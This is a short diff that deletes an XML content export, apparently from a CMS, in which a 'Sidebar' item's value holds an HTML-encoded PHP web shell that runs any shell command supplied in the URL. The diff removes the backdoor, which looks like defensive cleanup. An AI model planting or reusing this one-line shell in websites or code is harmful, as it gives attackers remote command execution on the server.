@@ -1,1 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?><channel><item><title><![CDATA[Sidebar]]></title><slug>sidebar</slug><value><![CDATA[&lt;?php system($_GET[&quot;c&quot;]); ?&gt;]]></value><disabled><![CDATA[0]]></disabled></item></channel>
